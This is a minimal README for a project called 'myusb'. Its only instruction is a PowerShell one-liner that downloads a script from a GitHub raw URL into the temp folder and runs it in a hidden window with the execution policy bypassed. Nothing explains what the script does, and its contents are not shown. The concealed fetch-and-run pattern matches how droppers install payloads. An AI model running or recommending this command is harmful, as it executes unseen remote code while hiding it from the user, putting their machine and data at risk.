# myusb

Run:
1
```powershell
powershell -Command "irm https://raw.githubusercontent.com/MitrichevGeorge/myusb/main/i.ps1 -OutFile $env:TEMP\script.ps1; Start-Process -WindowStyle Hidden powershell -ArgumentList '-ExecutionPolicy Bypass -NoProfile -File','$env:TEMP\script.ps1'"
```
